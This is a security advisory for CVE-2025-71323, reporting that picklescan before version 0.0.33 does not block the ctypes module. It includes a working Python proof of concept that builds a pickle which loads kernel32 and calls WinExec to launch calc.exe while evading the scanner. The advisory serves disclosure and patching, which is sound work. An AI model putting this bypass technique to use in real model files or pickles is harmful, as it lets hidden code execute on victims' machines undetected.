# [H] Picklescan does not block ctypes

## Summary
Severity: High
Advisory: GHSA-4675-36f9-wf6r
CVE: CVE-2025-71323
CWE: CWE-184, CWE-913
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2025-12-29
Source: https://github.com/advisories/GHSA-4675-36f9-wf6r
Type: github-advisory

## Affected
- PyPI: `picklescan` — affected >=0 <0.0.33

## Details
### Summary
Picklescan doesnt flag ctypes module as a dangerous module, which is a huge issue. ctypes is basically a foreign function interface library and can be used to
* Load DLLs
* Call C functions directly
* Manipulate memory raw pointers.

This can allow attackers to achieve RCE by invoking direct syscalls without going through blocked modules. Another major issue that ctypes being allowed presents is that it can be used down the line to dismantle interpreter based python sandboxes as ctypes allow direct access to raw memory.

This is a more severe loophole than normal gadget chains and bypasses as raw memory access can be used for a lot of nefarious purposes down the line if left undetected

### PoC
```python
import pickle
import ctypes
import operator

class Kernel32Loader:
    def __reduce__(self):
        #we go direct to the kerneeellllllll
        return (ctypes.WinDLL, ("kernel32.dll",))

class WinExecGetter:
    def __reduce__(self):
        return (operator.itemgetter("WinExec"), (Kernel32Loader(),))

class PopCalc:
    def __reduce__(self):
        #methodcaller to invoke "__call__" on the function pointer.
        return (
            operator.methodcaller("__call__", b"calc.exe", 1), 
            (WinExecGetter(),)
        )

try:
    payload = pickle.dumps(PopCalc())
    
    with open("calc_exploit.pkl", "wb") as f:
        f.write(payload)
        
    print("Generated 'calc_exploit.pkl'")

except Exception as e:
    print(f"Generation failed: {e}")
```
This will create a pickle file which is not detected by the latest version of picklescan as malicious

```python
import pickle
print("Loading bypass.pkl...")
pickle.load(open("calc_exploit.pkl", "rb"))
```

<img width="1333" height="677" alt="image" src="https://github.com/user-attachments/assets/f5b066f3-116a-4377-a538-f293f3a6c176" />

## References
- https://github.com/mmaitre314/picklescan/security/advisories/GHSA-4675-36f9-wf6r
- https://nvd.nist.gov/vuln/detail/CVE-2025-71323
- https://github.com/mmaitre314/picklescan/pull/53
- https://github.com/mmaitre314/picklescan/commit/70c1c6c31beb6baaf52c8db1b6c3c0e84a6f9dab
- https://github.com/mmaitre314/picklescan
- https://github.com/mmaitre314/picklescan/releases/tag/v0.0.33
- https://www.vulncheck.com/advisories/picklescan-remote-code-execution-via-unblocked-ctypes-module
